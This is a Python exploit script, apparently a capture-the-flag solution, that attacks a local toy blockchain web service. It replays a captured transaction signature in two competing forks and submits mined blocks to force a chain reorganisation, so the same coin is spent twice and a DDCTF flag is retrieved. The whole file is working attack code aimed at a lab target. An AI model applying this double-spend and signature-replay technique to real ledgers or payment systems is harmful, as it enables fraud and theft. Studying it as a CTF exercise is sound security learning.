# -*- encoding: utf-8 -*-
import rsa, uuid, json, copy, requests, re, hashlib
from functools import reduce

# 初始设置
DIFFICULTY = int('00000' + 'f' * 59, 16)
EMPTY_HASH = '0' * 64

'''hash函数'''
def hash(x):
    if isinstance(x, str):
        x = x.encode('utf-8')
    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()

def hash_reducer(x, y):
    return hash(hash(x) + hash(y))

def hash_utxo(utxo):
    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])

def hash_tx(tx):
    return reduce(hash_reducer, [
        reduce(hash_reducer, tx['input'], EMPTY_HASH),
        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
    ])

def hash_block(block):
    tx_hashes = [tx['hash'] for tx in block['transactions']]
    tx_root = reduce(hash_reducer, tx_hashes, EMPTY_HASH) if tx_hashes else EMPTY_HASH
    return reduce(hash_reducer, [block['prev'], block['nonce'], tx_root])

def header_change(session):
    return {
        "Host": "127.0.0.1:5000",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8",
        "Cookie": "session=" + session,
        "Connection": "close",
        "Content-Type": "application/json"
    }

'''
def get_headers(session):
    return {
        "Cookie": "session=" + session,
        "Content-Type": "application/json"
    }
'''

def show_blockchain(url_prefix, session):
    headers = header_change(session)
    flag_response = requests.get(url_prefix + '/flag', headers=headers)
    flag_text = flag_response.text.strip()   
    print(f"flag: {flag_text}")
    if "you have" in flag_text:
        diamonds_match = re.search(r'you have (\d+) diamonds', flag_text)
        if diamonds_match:
            diamonds = diamonds_match.group(1)
            print(f"钻石: {diamonds}")

def extract_blockchain_info(html_content):
    info = {}
    
    genesis_match = re.search(r'hash of genesis block: ([a-f0-9]+)', html_content)
    if genesis_match:
        info['genesis_hash'] = genesis_match.group(1)
        print(f"创世区块: {info['genesis_hash']}")
    
    bank_match = re.search(r"the bank's addr: ([a-f0-9]+)", html_content)
    hacker_match = re.search(r"the hacker's addr: ([a-f0-9]+)", html_content)  
    shop_match = re.search(r"the shop's addr: ([a-f0-9]+)", html_content)
    
    if bank_match and hacker_match and shop_match:
        info['bank_addr'] = bank_match.group(1)
        print(f"银行地址: {info['bank_addr']}")
        info['hacker_addr'] = hacker_match.group(1)
        print(f"黑客地址: {info['hacker_addr']}")
        info['shop_addr'] = shop_match.group(1)
        print(f"商店地址: {info['shop_addr']}")
    
    blocks_match = re.search(r"Blockchain Explorer: ({.*})", html_content)
    if blocks_match:
        blocks_data = json.loads(blocks_match.group(1))
        info['blocks'] = blocks_data
            
        for block_hash, block in blocks_data.items():
            if block.get('height') == 1 and block.get('transactions'):
                for tx in block['transactions']:
                    if tx.get('input') and len(tx['input']) > 0:
                        info['input_utxo'] = tx['input'][0]
                        if tx.get('signature') and len(tx['signature']) > 0:
                            info['signature'] = tx['signature'][0]
                        print(f"输入UTXO: {info['input_utxo']}")
                        print(f"签名: {info['signature'][:20]}...")
                        break
                break
    
    return info

def pow_search(b, difficulty, msg=""):
    nonce = 0
    print(f"开始PoW计算 {msg}")
    
    while nonce < (2**32):
        b['nonce'] = msg + str(nonce)
        b['hash'] = hash_block(b)
        block_hash_int = int(b['hash'], 16)
        
        if block_hash_int < difficulty:
            print(f"找到有效nonce: {nonce}, 哈希: {b['hash']}")
            return b
        
        if nonce % 100000 == 0 and nonce > 0:
            print(f"已尝试 {nonce} 次...")
        
        nonce += 1
    
    return None

def myprint(b):
    return json.dumps(b)

def create_empty_block(prev_hash, msg=""):
    b = {}
    b["prev"] = prev_hash
    b["transactions"] = []
    return pow_search(b, DIFFICULTY, msg)

def initialize_attack():
    url = "http://127.0.0.1:5000/b9af31f66147e/"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    }
    
    r = requests.get(url=url, headers=headers)

    if 'Set-Cookie' in r.headers:
        session = r.headers['Set-Cookie'].split(";")[0][8:]
        print(f"session: {session[:20]}...")
    else:
        session = "default_session"
    
    return r, session

def inf_extraction(r):
    info = extract_blockchain_info(r.text)

    genesis_hash = info['genesis_hash']
    shop_address = info['shop_addr']
    input_val = info['input_utxo']
    signature = info['signature']
    txout_id = str(uuid.uuid4())

    return genesis_hash, shop_address, input_val, signature, txout_id

def final_check(session):
    print("攻击结果")
    flag_url = "http://127.0.0.1:5000/b9af31f66147e/flag"
    flag_response = requests.get(url=flag_url, headers=header_change(session))
    print(f"最终结果: {flag_response.text}")

    flag_match = re.search(r'DDCTF\{[^}]+\}', flag_response.text)
    if flag_match:
            print(f"Flag: {flag_match.group(0)}")
'''
def main_attack():
    r, session = initialize_attack()

    genesis_hash, shop_address, input_val, signature, txout_id = inf_extraction(r)

    print("初始化完成，攻击开始")
    show_blockchain("http://127.0.0.1:5000/b9af31f66147e", session)

    block1 = {}
    block1["prev"] = genesis_hash
    tx = {
        "input": [input_val], 
        "output": [{
            "amount": 1000000, 
            'id': txout_id, 
            'addr': shop_address
        }], 
        'signature': [signature]
    }

    # 计算UTXO和交易哈希
    tx["output"][0]["hash"] = hash_utxo(tx["output"][0])
    tx['hash'] = hash_tx(tx)
    block1["transactions"] = [tx]

    block1 = pow_search(block1, DIFFICULTY)
    if block1 is None:
        print(1)
        return

    url_begin = "http://127.0.0.1:5000/b9af31f66147e/create_transaction"

    print("提交第一个区块...")
    s1 = requests.post(url=url_begin, data=myprint(block1), headers=header_change(session))
    
    if 'Set-Cookie' in s1.headers:
        session = s1.headers['Set-Cookie'].split(";")[0][8:]
        print(f"更新session: {session[:20]}...")
    
    print(f"结果: {s1.text}")

    last_hash = block1["hash"]
    for i in range(2, 4):
        print(f"空区块 {i}...")
        empty_block = create_empty_block(last_hash, f"空{i}")
        if empty_block is None:
            print(2)
            break
            
        print(f"提交空区块 {i}...")
        result = requests.post(url=url_begin, data=myprint(empty_block), headers=header_change(session))
        if 'Set-Cookie' in result.headers:
            session = result.headers['Set-Cookie'].split(";")[0][8:]
            print(f"更新session: {session[:20]}...")
        print(f"结果: {result.text}")
        last_hash = empty_block["hash"]

    print("\n分叉实现双花...")
    for i in range(4, 6):
        print(f"双花区块 {i}...")
        double_spend_block = create_empty_block(last_hash, f"双花{i}")
        if double_spend_block is None:
            print(3)
            break
            
        print(f"提交双花区块 {i}...")
        result = requests.post(url=url_begin, data=myprint(double_spend_block), headers=header_change(session))
        if 'Set-Cookie' in result.headers:
            session = result.headers['Set-Cookie'].split(";")[0][8:]
            print(f"更新session: {session[:20]}...")
        print(f"结果: {result.text}")
        last_hash = double_spend_block["hash"]


    final_check(session)
'''
def main_attack():
    r, session = initialize_attack()

    genesis_hash, shop_address, input_val, signature, txout_id = inf_extraction(r)

    print("初始化完成，攻击开始")
    show_blockchain("http://127.0.0.1:5000/b9af31f66147e", session)

    # 构建两个分叉链
    print("构建双花攻击...")
    
    # 分叉A：UTXO给商店
    tx_a = {
        "input": [input_val], 
        "output": [{
            "amount": 1000000, 
            'id': str(uuid.uuid4()),
            'addr': shop_address
        }], 
        'signature': [signature]
    }
    tx_a["output"][0]["hash"] = hash_utxo(tx_a["output"][0])
    tx_a['hash'] = hash_tx(tx_a)

    # 分叉A的区块
    block1_a = {
        "prev": genesis_hash,
        "transactions": [tx_a]
    }
    block1_a = pow_search(block1_a, DIFFICULTY, "分叉A-1")
    if block1_a is None: return

    block2_a = create_empty_block(block1_a["hash"], "分叉A-2")
    if block2_a is None: return

    block3_a = create_empty_block(block2_a["hash"], "分叉A-3")
    if block3_a is None: return

    # 分叉B：同样的UTXO再次给商店
    tx_b = {
        "input": [input_val],  # 同样的UTXO！
        "output": [{
            "amount": 1000000, 
            'id': str(uuid.uuid4()),
            'addr': shop_address
        }], 
        'signature': [signature]
    }
    tx_b["output"][0]["hash"] = hash_utxo(tx_b["output"][0])
    tx_b['hash'] = hash_tx(tx_b)

    # 分叉B的区块（比A更长）
    block1_b = {
        "prev": genesis_hash,  # 同样的父区块！
        "transactions": [tx_b]
    }
    block1_b = pow_search(block1_b, DIFFICULTY, "分叉B-1")
    if block1_b is None: return

    block2_b = create_empty_block(block1_b["hash"], "分叉B-2")
    if block2_b is None: return

    block3_b = create_empty_block(block2_b["hash"], "分叉B-3")
    if block3_b is None: return

    block4_b = create_empty_block(block3_b["hash"], "分叉B-4")
    if block4_b is None: return

    block5_b = create_empty_block(block4_b["hash"], "分叉B-5")
    if block5_b is None: return

    url_begin = "http://127.0.0.1:5000/b9af31f66147e/create_transaction"

    # 关键：一次性提交整个攻击
    # 先快速提交分叉A的前两个区块
    print("提交分叉A（前2个区块）...")
    for i, block in enumerate([block1_a, block2_a], 1):
        result = requests.post(url_begin, data=json.dumps(block), headers=header_change(session))
        if 'Set-Cookie' in result.headers:
            session = result.headers['Set-Cookie'].split(";")[0][8:]
        print(f"分叉A区块{i}: {result.text}")

    # 然后一次性提交完整的分叉B（更长的链）
    print("提交分叉B（5个区块，触发重组）...")
    for i, block in enumerate([block1_b, block2_b, block3_b, block4_b, block5_b], 1):
        result = requests.post(url_begin, data=json.dumps(block), headers=header_change(session))
        if 'Set-Cookie' in result.headers:
            session = result.headers['Set-Cookie'].split(";")[0][8:]
        print(f"分叉B区块{i}: {result.text}")

    print("\n攻击完成，检查结果...")
    final_check(session)




if __name__ == "__main__":
    main_attack()